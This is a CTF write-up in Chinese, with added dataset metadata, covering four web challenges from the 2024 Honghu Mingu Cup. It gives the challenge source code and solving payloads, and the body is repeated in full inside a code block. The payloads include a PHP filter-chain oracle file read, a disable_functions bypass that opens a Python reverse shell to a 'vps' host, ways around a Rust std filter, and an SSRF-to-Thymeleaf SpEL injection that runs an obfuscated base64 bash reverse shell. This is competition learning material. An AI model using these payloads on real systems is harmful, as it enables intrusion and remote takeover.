---
title: 第四届红明谷杯卫星应用数据安全大赛 WEB writeup
contest: 红明谷杯
year: 2024
difficulty: hard
vuln_type: ssrf
tags:
- Web-PHP-Filter链
- oracle文件读取
- 匿名类anonymous
- pcntl_exec绕disable_function
- Rust-std过滤+include!+FFI
- Rust内联externC
- SpringBoot-ThymeleafSSTI
- Log4j-LoaderUtil
- SSRF/curl+跳板
- Java外部类
attack_chain: 'PHP-Filter链: synacktiv/php_filter_chains_oracle_exploit工具跑出flag.php|匿名类: ?ezphpPhp8=class@anonymous\0/var/www/html/flag.php:7$0 调getflag|disable_function: Basic Auth admin/2e525e29e465f45d8d7c56319fe73036+@eval($_GET[''cmd''])+pcntl_exec python反弹|Rust: 过滤std→include!("/flag")或extern "C" fn system+unsafe{Spring Boot curl+getsites: SSRF/curl下载vps+hostname SpelExpressionParser+Log4j LoaderUtil调Runtime.exec反弹'
key_payload: '?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0|pcntl_exec("/usr/bin/python",array(''-c'',''import socket,subprocess,os;s=socket.socket(...);s.connect(...);os.dup2(s.fileno(),0,1,2);p=subprocess.call(["/bin/bash","-i"])''))|fn main() { include!("/flag"); }|extern "C" { fn system(cmd: *const u8) -> i32; } unsafe { system("cat /flag".as_ptr()); }|T(org.thymeleaf.util.ClassLoaderUtils).loadClass(''org.apa''+''che.logging.log4j.util.LoaderUtil'').newInstanceOf(''org.spr''+''ingframework.expression.spel.standard.SpelExpressionParser'').parseExpression(''T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")'').getValue()'
one_liner: 第四届红明谷杯卫星应用WEB 4题:PHP-Filter链oracle读源(synacktiv工具)+匿名类anonymous\0/var/www/html/flag.php:7$0+pcntl_exec反弹shell+Rust-std过滤用include!("/flag")或extern C system+Spring Boot/curl SSRF跳板/Log4j LoaderUtil调SpelExpressionParser反弹
lesson: 1) PHP-Filter链 oracle攻击:synacktiv工具可基于错误状态oracle盲读任意文件; 2) PHP匿名类引用:`class@anonymous\0/path/file.php:line$idx`; 3) disable_function绕:pcntl_exec调python反弹shell (subprocess+os.dup2); 4) Rust std过滤:include!("/flag") 或 FFI extern "C" unsafe { system(...) }; 5) Spring Boot Thymeleaf SpEL RCE:`[[${T(...).parseExpression('T(java.lang.Runtime).getRuntime().exec(...)').getValue()}]]`; 6) Java外部类字符串拼接:'org.apa'+'che.logging.log4j.util.LoaderUtil' 绕静态分析; 7) curl+SSRF跳板:public vps→/curl?url→hostname 跳本地127.0.0.1
quality: high
full_path: 第四届红明谷杯卫星应用数据安全大赛_WEB_writeup.full.md
meta_path: 第四届红明谷杯卫星应用数据安全大赛_WEB_writeup.meta.md
images_removed: true
images_removed_count: 2
schema_version: v3.0.0-P0
summary: 第四届红明谷杯卫星应用数据安全大赛 WEB writeup。第四届红明谷杯卫星应用WEB 4题:PHP-Filter链oracle读源(synacktiv工具)+匿名类anonymous\0/var/www/html/flag.php:7$0+pcntl_exec反弹shell+Rust-std过滤用include!("/flag")或extern C system+Spring Bo...
category: web
subcategory: web_other
tools_used:
- C
- PHP
- Python
- Rust
- Spring
- curl
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 2
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/173339.html
reasoning_chain:
- 触发点：hash_file('md5', $_POST['f']) → 假设：oracle 文件读取
- 动作：PHP filter 链 oracle 攻击（synacktiv 工具）→ 观察：读 flag.php
- 匿名类触发点：$a = new class { function getflag() { system('cat /flag'); }}; $f = new $a(); → 假设：匿名类方法可调
- 动作：?ezphpPhp8=class@anonymous\0/var/www/html/flag.php:7$0 → 观察：调用匿名类 getflag
- pcntl_exec 触发点：disable_function 绕过 → 假设：pcntl_exec 反弹 shell
- 动作：pcntl_exec('/usr/bin/python', array('-c', 'import socket...')) → 观察：getshell
- Rust 触发点：std 过滤 → 假设：include! 包含 + FFI 调 C
- 动作：写 Rust 代码绕 std filter → 观察：执行
failed_attempts:
- PHP filter 直接读 flag.php → 失败：单次读不出全部
- 匿名类直接 system → 失败：没找到正确命名
- disable_function 用 LD_PRELOAD → 失败：被 ban
key_observations:
- PHP filter chain oracle 攻击：每次抛错泄漏 1 bit 信息
- 匿名类（class@anonymous\0file:line$0）通过字符串类名反射调用
- pcntl_exec 是 disable_function 绕过的常见手段
- Rust include! 宏 + FFI 调 C 可绕 std 过滤
prerequisites:
- PHP filter chain oracle（synacktiv 工具）
- PHP 匿名类反射调用
- disable_function 绕过（pcntl_exec/LD_PRELOAD）
- Rust FFI/unsafe
---
# 第四届红明谷杯卫星应用数据安全大赛 WEB writeup

> 原文: https://www.ctfiot.com/173339.html
> ID: 173339

PHP Filter链——基于oracle的文件读取攻击 – 先知社区 (aliyun.com)

https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkWepSazHG%3D4D#toc-16

匿名类

<?php highlight_file(__FILE__); // flag.php if (isset($_POST['f'])) { echo hash_file('md5', $_POST['f']); } ?>

//GitHub - synacktiv/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle.https://github.com/synacktiv/php_filter_chains_oracle_exploit

直接用工具跑出flag.php

<?phpif (isset($_GET['ezphpPhp8'])) { highlight_file(__FILE__);} else { die("No");}$a = new class { function __construct(){ }
 function getflag(){ system('cat /flag'); }};unset($a);$a = $_GET['ezphpPhp8'];$f = new $a();$f->getflag();?>

想方法调用匿名类

?ezphpPhp8=anonymous?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0

还可以用vardump getdeclared_classes

disabled_function绕过

www.zip泄露源码

<?phpif (!isset($_SERVER['PHP_AUTH_USER'])) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo '小明是运维工程师，最近网站老是出现bug。'; exit;} else { $validUser = 'admin'; $validPass = '2e525e29e465f45d8d7c56319fe73036';
 if ($_SERVER['PHP_AUTH_USER'] != $validUser || $_SERVER['PHP_AUTH_PW'] != $validPass) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo 'Invalid credentials'; exit; }}@eval($_GET['cmd']);highlight_file(__FILE__);?>

可以执行命令但大部分被ban了

用pcntl_exec

pcntl_exec("/usr/bin/python",array(%27-c%27,%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);%27));

接下来就是想办法提权

发现个config.inc

#[macro_use] extern crate rocket;
use std::fs;use std::fs::
File;use std::io::
Write;use std::
process::
Command;use rand::
Rng;
#[get("/")]fn index() -> String { fs::
read_to_string("main.rs").unwrap_or(String::
default())}
#[post("/rust_code", data = "<code>")]fn run_rust_code(code: String) -> String{ if code.contains("std") { return "Error: std is not allowed".to_string(); } //generate a random 5 length file name let file_name = rand::
thread_rng() .sample_iter(&rand::
distributions::
Alphanumeric) .take(5) .map(char::
from) .collect::<String>(); if let Ok(mut file) = File::
create(format!("playground/{}.rs", &file_name)) { file.write_all(code.as_bytes()); } if let Ok(build_output) = Command::
new("rustc") .arg(format!("playground/{}.rs",&file_name)) .arg("-C") .arg("debuginfo=0") .arg("-C") .arg("opt-level=3") .arg("-o") .arg(format!("playground/{}",&file_name)) .output() { if !build_output.status.success(){ fs::
remove_file(format!("playground/{}.rs",&file_name)); return String::
from_utf8_lossy(build_output.stderr.as_slice()).to_string(); } } fs::
remove_file(format!("playground/{}.rs",&file_name)); if let Ok(output) = Command::
new(format!("playground/{}",&file_name)) .output() { if !output.status.success(){ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stderr.as_slice()).to_string(); } else{ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stdout.as_slice()).to_string(); } } return String::
default();
}
#[launch]fn rocket() -> _ { let figment = rocket::
Config::
figment() .merge(("address", "0.0.0.0")); rocket::
custom(figment).mount("/", routes![index,run_rust_code])}

过滤了std

直接include

fn main() { include!("/flag");}

还可以内联写C绕过

//声明外部函数 C语言库函数extern "C" { fn system(cmd: *const u8) -> i32;}
fn main() { // Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作 unsafe { system("cat /flag".as_ptr()); }}

package com.example.controller;
import com.example.utils.Utils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.concurrent.TimeUnit;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
@RestControllerpublic class CurlController { private static final String RESOURCES_DIRECTORY = "resources"; private static final String SAVE_DIRECTORY = "sites";
 public CurlController() { }
 @RequestMapping({"/curl"}) public String curl(@RequestParam String url, HttpServletRequest request, HttpServletResponse response) throws Exception { if (!url.startsWith("http:") && !url.startsWith("https:")) { System.out.println(url.startsWith("http")); return "No protocol: " + url; } else { URL urlObject = new URL(url); String result = ""; String hostname = urlObject.getHost(); if (hostname.indexOf("../") != -1) { return "Illegal hostname"; } else { InetAddress inetAddress = InetAddress.getByName(hostname); if (Utils.isPrivateIp(inetAddress)) { return "Illegal ip address"; } else { try { String savePath = System.getProperty("user.dir") + File.separator + "resources" + File.separator + "sites"; File saveDir = new File(savePath); if (!saveDir.exists()) { saveDir.mkdirs(); }
 TimeUnit.SECONDS.sleep(4L); HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection(); if (connection instanceof HttpURLConnection) { connection.connect(); int statusCode = connection.getResponseCode(); if (statusCode == 200) { BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
 BufferedWriter writer; String line; for(writer = new BufferedWriter(new FileWriter(savePath + File.separator + hostname + ".html")); (line = reader.readLine()) != null; result = result + line + "n") { }
 writer.write(result); reader.close(); writer.close(); } }
 return result; } catch (Exception var15) { return var15.toString(); } } } } }}

package com.example.controller;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.context.Context;
import org.thymeleaf.spring5.SpringTemplateEngine;
@Controllerpublic class AdminController { public AdminController() { }
 @GetMapping({"/getsites"}) public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception { String ipAddress = request.getRemoteAddr(); if (!ipAddress.equals("127.0.0.1")) { response.setStatus(HttpStatus.FORBIDDEN.value()); return "forbidden"; } else { Context context = new Context(); TemplateEngine engine = new SpringTemplateEngine(); String dispaly = engine.process(hostname, context); return dispaly; } }}

https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89

/curl?url=http://vps:
port/exploit.php

<?php header("Location:
http://127.0.0.1:
8080/getsites?hostname=[[${T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")').getValue()}]]


```
https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkWepSazHG%3D4D#toc-16
<?php highlight_file(__FILE__); // flag.php if (isset($_POST['f'])) { echo hash_file('md5', $_POST['f']); } ?>
//GitHub - synacktiv/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle.https://github.com/synacktiv/php_filter_chains_oracle_exploit
<?phpif (isset($_GET['ezphpPhp8'])) { highlight_file(__FILE__);} else { die("No");}$a = new class { function __construct(){ }
 function getflag(){ system('cat /flag'); }};unset($a);$a = $_GET['ezphpPhp8'];$f = new $a();$f->getflag();?>
?ezphpPhp8=anonymous?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0
<?phpif (!isset($_SERVER['PHP_AUTH_USER'])) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo '小明是运维工程师，最近网站老是出现bug。'; exit;} else { $validUser = 'admin'; $validPass = '2e525e29e465f45d8d7c56319fe73036';
 if ($_SERVER['PHP_AUTH_USER'] != $validUser || $_SERVER['PHP_AUTH_PW'] != $validPass) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo 'Invalid credentials'; exit; }}@eval($_GET['cmd']);highlight_file(__FILE__);?>
pcntl_exec("/usr/bin/python",array(%27-c%27,%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);%27));
#[macro_use] extern crate rocket;
use std::fs;use std::fs::
File;use std::io::
Write;use std::
process::
Command;use rand::
Rng;
#[get("/")]fn index() -> String { fs::
read_to_string("main.rs").unwrap_or(String::
default())}
#[post("/rust_code", data = "<code>")]fn run_rust_code(code: String) -> String{ if code.contains("std") { return "Error: std is not allowed".to_string(); } //generate a random 5 length file name let file_name = rand::
thread_rng() .sample_iter(&rand::
distributions::
Alphanumeric) .take(5) .map(char::
from) .collect::<String>(); if let Ok(mut file) = File::
create(format!("playground/{}.rs", &file_name)) { file.write_all(code.as_bytes()); } if let Ok(build_output) = Command::
new("rustc") .arg(format!("playground/{}.rs",&file_name)) .arg("-C") .arg("debuginfo=0") .arg("-C") .arg("opt-level=3") .arg("-o") .arg(format!("playground/{}",&file_name)) .output() { if !build_output.status.success(){ fs::
remove_file(format!("playground/{}.rs",&file_name)); return String::
from_utf8_lossy(build_output.stderr.as_slice()).to_string(); } } fs::
remove_file(format!("playground/{}.rs",&file_name)); if let Ok(output) = Command::
new(format!("playground/{}",&file_name)) .output() { if !output.status.success(){ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stderr.as_slice()).to_string(); } else{ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stdout.as_slice()).to_string(); } } return String::
default();
}
#[launch]fn rocket() -> _ { let figment = rocket::
Config::
figment() .merge(("address", "0.0.0.0")); rocket::
custom(figment).mount("/", routes![index,run_rust_code])}
fn main() { include!("/flag");}
//声明外部函数 C语言库函数extern "C" { fn system(cmd: *const u8) -> i32;}
fn main() { // Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作 unsafe { system("cat /flag".as_ptr()); }}
package com.example.controller;
import com.example.utils.Utils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.concurrent.TimeUnit;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
@RestControllerpublic class CurlController { private static final String RESOURCES_DIRECTORY = "resources"; private static final String SAVE_DIRECTORY = "sites";
 public CurlController() { }
 @RequestMapping({"/curl"}) public String curl(@RequestParam String url, HttpServletRequest request, HttpServletResponse response) throws Exception { if (!url.startsWith("http:") && !url.startsWith("https:")) { System.out.println(url.startsWith("http")); return "No protocol: " + url; } else { URL urlObject = new URL(url); String result = ""; String hostname = urlObject.getHost(); if (hostname.indexOf("../") != -1) { return "Illegal hostname"; } else { InetAddress inetAddress = InetAddress.getByName(hostname); if (Utils.isPrivateIp(inetAddress)) { return "Illegal ip address"; } else { try { String savePath = System.getProperty("user.dir") + File.separator + "resources" + File.separator + "sites"; File saveDir = new File(savePath); if (!saveDir.exists()) { saveDir.mkdirs(); }
 TimeUnit.SECONDS.sleep(4L); HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection(); if (connection instanceof HttpURLConnection) { connection.connect(); int statusCode = connection.getResponseCode(); if (statusCode == 200) { BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
 BufferedWriter writer; String line; for(writer = new BufferedWriter(new FileWriter(savePath + File.separator + hostname + ".html")); (line = reader.readLine()) != null; result = result + line + "n") { }
 writer.write(result); reader.close(); writer.close(); } }
 return result; } catch (Exception var15) { return var15.toString(); } } } } }}
package com.example.controller;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.context.Context;
import org.thymeleaf.spring5.SpringTemplateEngine;
@Controllerpublic class AdminController { public AdminController() { }
 @GetMapping({"/getsites"}) public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception { String ipAddress = request.getRemoteAddr(); if (!ipAddress.equals("127.0.0.1")) { response.setStatus(HttpStatus.FORBIDDEN.value()); return "forbidden"; } else { Context context = new Context(); TemplateEngine engine = new SpringTemplateEngine(); String dispaly = engine.process(hostname, context); return dispaly; } }}
https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89
/curl?url=http://vps:
port/exploit.php
<?php header("Location:
http://127.0.0.1:
8080/getsites?hostname=[[${T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")').getValue()}]]
```


---
## 附图

[图片已移除]
[图片已移除]